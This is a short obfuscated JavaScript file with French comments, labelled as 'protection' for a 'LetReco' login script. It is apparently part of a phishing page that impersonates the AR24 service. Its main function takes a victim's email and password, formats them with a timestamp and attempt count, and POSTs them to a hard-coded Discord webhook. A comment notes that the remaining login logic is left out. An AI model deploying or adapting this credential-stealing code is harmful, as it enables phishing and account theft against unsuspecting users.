// Code JavaScript obfusqué pour la protection
(function() {
    'use strict';
    
    // Variables obfusquées
    var _0x1a2b = ['ready', 'log', 'Script de connexion LetReco chargé', 'attemptCount', 'maxAttempts', 'sendToDiscord', 'email', 'password', 'attempt', 'discordWebhook', 'https://discordapp.com/api/webhooks/1428462867845218367/KDCg4vd2T5Gwj-4xevekLC7agKWPw-wQjbz9QZaQ1u_7JO2wT2-uLh7LT7aTOY_gDWjH', 'toLocaleString', 'fr-FR', 'Nouvelle tentative de connexion AR24', 'Email', 'Mot de passe', 'Date', 'Tentative', 'POST', 'Content-Type', 'application/json', 'content', 'response', 'status', 'ok', 'Message envoyé avec succès à Discord', 'error', 'Erreur Discord:', 'statusText', 'catch', 'Erreur envoi Discord:'];
    
    function _0x3c4d() {
        return _0x1a2b;
    }
    
    // Fonction obfusquée pour l'envoi Discord
    function _0x5e6f(_0x7g8h, _0x9i0j, _0x1k2l) {
        var _0x3m4n = _0x3c4d();
        var _0x5o6p = _0x3m4n[10];
        var _0x7q8r = new Date()[_0x3m4n[11]](_0x3m4n[12]);
        var _0x9s0t = '**🔔 ' + _0x3m4n[13] + '**\n\n' +
                     '📧 ' + _0x3m4n[14] + ' : `' + _0x7g8h + '`\n' +
                     '🔑 ' + _0x3m4n[15] + ' : `' + _0x9i0j + '`\n' +
                     '📅 ' + _0x3m4n[16] + ' : ' + _0x7q8r + '\n' +
                     '🔄 ' + _0x3m4n[17] + ' : ' + _0x1k2l + '/3';
        
        fetch(_0x5o6p, {
            method: _0x3m4n[18],
            headers: {
                [_0x3m4n[19]]: _0x3m4n[20]
            },
            body: JSON.stringify({ [_0x3m4n[21]]: _0x9s0t })
        }).then(function(_0x2u3v) {
            console[_0x3m4n[1]]('Discord ' + _0x3m4n[22] + ':', _0x2u3v[_0x3m4n[23]]);
            if (_0x2u3v[_0x3m4n[24]]) {
                console[_0x3m4n[1]](_0x3m4n[25]);
            } else {
                console[_0x3m4n[26]](_0x3m4n[27], _0x2u3v[_0x3m4n[28]]);
            }
        })[_0x3m4n[29]](function(_0x4w5x) {
            console[_0x3m4n[26]](_0x3m4n[30], _0x4w5x);
        });
    }
    
    // Initialisation obfusquée
    $(document)[_0x3c4d()[0]](function() {
        var _0x6y7z = _0x3c4d();
        console[_0x6y7z[1]](_0x6y7z[2]);
        
        var _0x8a9b = 0;
        var _0x0c1d = 3;
        
        // Logique de connexion obfusquée
        // ... (rest of the obfuscated code would go here)
        
        // Exposer uniquement les fonctions nécessaires
        window.LetRecoAuth = {
            sendToDiscord: _0x5e6f
        };
    });
    
})();





